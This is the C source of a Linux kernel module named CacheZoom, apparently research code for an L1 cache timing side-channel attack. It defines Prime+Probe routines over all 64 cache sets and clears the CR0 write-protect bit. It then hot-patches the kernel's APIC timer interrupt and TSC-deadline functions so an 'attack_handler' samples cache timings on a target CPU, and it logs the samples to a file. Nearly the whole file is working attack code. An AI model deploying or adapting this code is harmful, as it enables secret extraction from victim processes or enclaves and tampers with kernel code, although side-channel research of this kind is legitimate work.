#include <linux/module.h>
#include <linux/types.h>
#include <linux/moduleparam.h>
#include <linux/init.h>
#include <linux/types.h>
#include <linux/miscdevice.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/sched.h>
#include <linux/cpumask.h>
#include <linux/pid.h>
#include <linux/slab.h>
#include <linux/fs.h>
#include <linux/mm_types.h>
#include <linux/semaphore.h>
#include <asm/segment.h>
#include <asm/uaccess.h>
#include <linux/buffer_head.h>
#include "cachezoom_kernel.h"



unsigned long long plapic_next_deadLine;
unsigned long long plocal_apic_timer_interrupt;


#define CPU_L1_CACHE_SET_COUNT   64
#define CPU_L1_CACHE_SET_ASSOC   8
#define CPU_L1_LINE_OFFSET_WORD  0b1000000000000

#define SPY_TABLE_SIZE 0x20000

#define idx(_line, _set) ( ((CPU_L1_LINE_OFFSET_WORD) * (_line)) / 8 + (((CPU_L1_CACHE_SET_ASSOC) * (_set))))
#define idx0(_set) ((((CPU_L1_CACHE_SET_ASSOC) * (_set))))


#define MAX_MEASUREMENT 50000


unsigned char target_cpu;
unsigned int timer_interval_tsc;


typedef struct _measurement_type {
  unsigned char buffer[CPU_L1_CACHE_SET_COUNT];
} Measurement ;

Measurement * measurements = NULL;

unsigned long long m_counter = 0; 


#define \
prime(_table, _set)({\
  do {\
    register uint16_t delta;\
    asm volatile(\
      "mfence;"\
      "mov (%%rbx), %%rbx;"\
      "mov (%%rbx), %%rbx;"\
      "mov (%%rbx), %%rbx;"\
      "mov (%%rbx), %%rbx;"\
      "mov (%%rbx), %%rbx;"\
      "mov (%%rbx), %%rbx;"\
      "mov (%%rbx), %%rbx;"\
      "mov (%%rbx), %%rbx;"\
      : \
      : [_itr] "b" (_table + idx(0, _set))\
    );\
    } while(0);\
})

#define PRIME prime(_SPY_POINTER_LIST_, _CURRENT_SET_); _CURRENT_SET_++
#define PRIME_2 PRIME; PRIME
#define PRIME_4 PRIME_2; PRIME_2
#define PRIME_8 PRIME_4; PRIME_4
#define PRIME_16 PRIME_8; PRIME_8
#define PRIME_32 PRIME_16; PRIME_16
#define PRIME_64 PRIME_32; PRIME_32

#define \
probe(_table, _set)({\
  do {\
    register uint32_t delta;\
    asm volatile(\
      "mov %%rax, %%r10;"\
      "mfence;"\
      "rdtsc;"\
      "mov %%eax, %%ecx;"\
      "mov (%%rbx), %%rbx;"\
      "mov (%%rbx), %%rbx;"\
      "mov (%%rbx), %%rbx;"\
      "mov (%%rbx), %%rbx;"\
      "mov (%%rbx), %%rbx;"\
      "mov (%%rbx), %%rbx;"\
      "mov (%%rbx), %%rbx;"\
      "mov (%%rbx), %%rbx;"\
      "lfence;"\
      "rdtsc;"\
      "sub %%rax, %%rcx;"\
      "mov %%r10, %%rax;"\
      "neg %%rcx;"\
      : "=c" (delta)\
      : [_itr] "b" (_table + idx(7, _set) + 1)\
    );\
    if(delta > 0xff)\
      *((char*)(_table + idx0(_set) + 2)) = 0xff;\
    else\
      *((char*)(_table + idx0(_set) + 2)) = delta;\
    } while(0);\
})

#define PROBE probe(_SPY_POINTER_LIST_, _CURRENT_SET_); _CURRENT_SET_++
#define PROBE_2 PROBE; PROBE
#define PROBE_4 PROBE_2; PROBE_2
#define PROBE_8 PROBE_4; PROBE_4
#define PROBE_16 PROBE_8; PROBE_8
#define PROBE_32 PROBE_16; PROBE_16
#define PROBE_64 PROBE_32; PROBE_32


static uint64_t volatile * _SPY_POINTER_LIST_ = NULL;
static bool hooked = false;

struct file * file_open(const char* path, int flags, int rights)
{
  struct file* filp = NULL;
  mm_segment_t oldfs;
  int err = 0;

  oldfs = get_fs();
  set_fs(get_ds());
  filp = filp_open(path, flags, rights);
  set_fs(oldfs);
  if(IS_ERR(filp)) {
    err = PTR_ERR(filp);
    return NULL;
  }
  return filp;
}

int file_write(struct file* file, unsigned long long offset, unsigned char* data, 
    unsigned int size) {
  mm_segment_t oldfs;
  int ret;

  oldfs = get_fs();
  set_fs(get_ds());

  ret = vfs_write(file, data, size, &offset);

  set_fs(oldfs);
  return ret;
}


void write_down_measurements(void)
{
  struct file * fp;
  fp = file_open("../../data/samples.data", O_WRONLY|O_CREAT, 0644);
  file_write(fp, 0, measurements, sizeof(Measurement) * MAX_MEASUREMENT);
  vfs_fsync(fp, 0);
  filp_close(fp, NULL);
  memset((void*)measurements, 0, sizeof(Measurement) * MAX_MEASUREMENT);
}

static void attack_handler(void);
static int deadline_handler(unsigned long delta, void * evt);

static void enable_attack_timer()
{
  unsigned int target_addr;
  unsigned char call_stub[] = {0xe8, 0xf1, 0xf2, 0xf3, 0xf4};
  unsigned char  jmp_stub[] = {0xe9, 0xf1, 0xf2, 0xf3, 0xf4};

  m_counter = 0;
  write_cr0 (read_cr0 () & (~ 0x10000));

  target_addr = attack_handler - plocal_apic_timer_interrupt - 5;  
  call_stub[1] = ((char*)&target_addr)[0];
  call_stub[2] = ((char*)&target_addr)[1];
  call_stub[3] = ((char*)&target_addr)[2];
  call_stub[4] = ((char*)&target_addr)[3];
  memcpy((void*)plocal_apic_timer_interrupt, call_stub, sizeof(call_stub));  

  target_addr = deadline_handler - plapic_next_deadLine - 5;
  jmp_stub[1] = ((char*)&target_addr)[0];
  jmp_stub[2] = ((char*)&target_addr)[1];
  jmp_stub[3] = ((char*)&target_addr)[2];
  jmp_stub[4] = ((char*)&target_addr)[3];
  memcpy((void*)plapic_next_deadLine, jmp_stub, sizeof(jmp_stub));  

  write_cr0 (read_cr0 () | 0x10000);

  hooked = true;
 
  printk("CACHEZOOM: ENABLED\n");
}

static void disable_attack_timer()
{
  int i;
  unsigned long last_timer = 0;
  unsigned char nop_stub[] = {0x90, 0x90, 0x90, 0x90, 0x90};
  
  if(hooked){
    write_cr0 (read_cr0 () & (~ 0x10000));
    memcpy((void*)plocal_apic_timer_interrupt, nop_stub, sizeof(nop_stub));  
    memcpy((void*)plapic_next_deadLine, nop_stub, sizeof(nop_stub));  
    hooked = false;   
  }

  write_cr0 (read_cr0 () | 0x10000);
  printk("CACHEZOOM: DISABLED, ITER: %lu!\n", m_counter);
  m_counter = 0;
}

static long cachezoom_ioctl_uninstall_timer(struct file *filep,
  unsigned int cmd, unsigned long arg)
{
  disable_attack_timer();
  
  printk(KERN_ALERT "CACHEZOOM: COPY SAMPLES\n");
  write_down_measurements();

  return 0;
}


static long cachezoom_ioctl_test(struct file *filep,
  unsigned int cmd, unsigned long arg)
{
  register int _CURRENT_SET_;
  asm(".align 64");
  for(_CURRENT_SET_ = 0; _CURRENT_SET_ < CPU_L1_CACHE_SET_COUNT; _CURRENT_SET_++)
    prime(_SPY_POINTER_LIST_, _CURRENT_SET_);
  
  asm volatile(".align 64");

  for(_CURRENT_SET_ = 0; _CURRENT_SET_ < CPU_L1_CACHE_SET_COUNT; _CURRENT_SET_++)
    probe(_SPY_POINTER_LIST_, _CURRENT_SET_);

  for(_CURRENT_SET_ = 0; _CURRENT_SET_ < CPU_L1_CACHE_SET_COUNT; _CURRENT_SET_++){
    printk(KERN_ALERT "%d: %d\n", _CURRENT_SET_, *(_SPY_POINTER_LIST_ + idx0(_CURRENT_SET_) + 2));
  }
  
  printk("............................................................\n"); 
  return 0;
}


static long cachezoom_ioctl_init(struct file *filep,
  unsigned int cmd, unsigned long arg)
{
  struct cachezoom_generic_param * param;
  param = (struct cachezoom_generic_param *) arg;
  plapic_next_deadLine = param->param_0;  
  plocal_apic_timer_interrupt = param->param_1;
  timer_interval_tsc = param->param_2;
  target_cpu = param->param_3;
  return 0;
}

static long cachezoom_ioctl_install_timer(struct file *filep,
  unsigned int cmd, unsigned long arg)
{
  enable_attack_timer();
  return 0;
}


typedef long (*cachezoom_ioctl_t)(struct file *filep,
	unsigned int cmd, unsigned long arg);

long cachezoom_ioctl(struct file *filep, unsigned int cmd, 
	unsigned long arg)
{
  char data[256];
  long ret;
  cachezoom_ioctl_t handler = NULL;

  switch (cmd) {
    case CACHEZOOM_IOCTL_TEST:
      handler = cachezoom_ioctl_test;
      break;
    case CACHEZOOM_IOCTL_UNINSTALL_TIMER:
      handler = cachezoom_ioctl_uninstall_timer;
      break;	
    case CACHEZOOM_IOCTL_INSTALL_TIMER:
      handler = cachezoom_ioctl_install_timer;
      break;	
    case CACHEZOOM_IOCTL_INIT:
      handler = cachezoom_ioctl_init;
      break;  
    default:
      return -EINVAL;
  }
  
  if (copy_from_user(data, (void __user *) arg, _IOC_SIZE(cmd)))
    return -EFAULT;

  ret = handler(filep, cmd, (unsigned long) ((void *) data));

  if (!ret && (cmd & IOC_OUT)) {
    if (copy_to_user((void __user *) arg, data, _IOC_SIZE(cmd)))
      return -EFAULT;
  }
  return ret;
}

static const struct file_operations cachezoom_fops = {
  .owner = THIS_MODULE,
  .unlocked_ioctl = cachezoom_ioctl,
};

static struct miscdevice cachezoom_miscdev = {
  .minor = MISC_DYNAMIC_MINOR,
  .name = "cachezoom",
  .fops = &cachezoom_fops,
};


static int deadline_handler(unsigned long delta, void * evt)
{
  register int _CURRENT_SET_;
  u64 tsc;
  if(smp_processor_id() == target_cpu)
  {
    tsc = rdtsc();
    wrmsrl(MSR_IA32_TSC_DEADLINE, tsc + timer_interval_tsc);		
  }
  else {
		#define TSC_DIVISOR  8
    tsc = rdtsc();
    wrmsrl(MSR_IA32_TSC_DEADLINE, tsc + (((u64) delta) * TSC_DIVISOR));
  }
  return 0;
}

static void attack_handler(void)
{
  if(smp_processor_id() == target_cpu)
  {
    register int _CURRENT_SET_;
    
    asm volatile(".align 64");
    _CURRENT_SET_ = 0;
    PROBE_64;    

    for(_CURRENT_SET_ = 0; _CURRENT_SET_ < CPU_L1_CACHE_SET_COUNT; _CURRENT_SET_++)
    {
      measurements[m_counter % MAX_MEASUREMENT].buffer[_CURRENT_SET_] = 
      	*(_SPY_POINTER_LIST_ + idx0(_CURRENT_SET_) + 2);
    }      
    
    m_counter++;

    _CURRENT_SET_ = 0;
    PRIME_64;
  }
}

#define \
init_spy_set(_table, _set)({\
  do {\
    int _i;\
    uint32_t cellIdx, nextCellIdx, prevCellIdx;\
    for(_i = 0; _i < CPU_L1_CACHE_SET_ASSOC - 1; _i++){\
      cellIdx = idx(_i, _set);\
      nextCellIdx = idx(_i + 1, _set);\
      *(_table + cellIdx) = _table + nextCellIdx;\
    }\
    for(_i = CPU_L1_CACHE_SET_ASSOC + 1; _i > 0; _i--)\
    {\
        cellIdx = idx(_i, _set) + 1;\
        prevCellIdx = idx(_i - 1, _set) + 1;\
       *(_table + cellIdx) = _table + prevCellIdx;\
    }\
    asm volatile("wbinvd;");\
  } while(0);\
})

static void spy_list_init(void)
{
	register int set;
	printk(KERN_ALERT "CACHEZOOM: INIT SPY BUFF\n");

	// Allocate the memory for the pointer lists 
	_SPY_POINTER_LIST_ = kzalloc(SPY_TABLE_SIZE, GFP_KERNEL); 

  // Initialize the set associative pointers
  for(set = 0; set < CPU_L1_CACHE_SET_COUNT; set++)  
    init_spy_set(_SPY_POINTER_LIST_, set);
}


static int cachezoom_init(void)
{
  int ret;
  printk(KERN_ALERT "CACHEZOOM: HELLO\n");

  ret = misc_register(&cachezoom_miscdev);
  if (ret) {
    printk(KERN_ERR "cannot register miscdev(err=%d)\n", ret);
    return ret;
  }

  measurements = kzalloc(sizeof(Measurement) * MAX_MEASUREMENT, GFP_KERNEL);

  spy_list_init();
   
  return 0;
}


static void cachezoom_exit(void)
{ 

	// Turn off the timer hooks before leaving
  disable_attack_timer();

  // Remove the misc device
  misc_deregister(&cachezoom_miscdev);  

  // Free any kernel memory
  if(_SPY_POINTER_LIST_ != NULL)
  {
    kfree((void*)_SPY_POINTER_LIST_);
    _SPY_POINTER_LIST_ = NULL;
  }
  if(measurements != NULL)
  {
    kfree((void*)measurements);
    measurements = NULL;
  }

  // BYE
  printk(KERN_ALERT "CACHEZOOM: BYE\n");
}

module_init(cachezoom_init);
module_exit(cachezoom_exit);

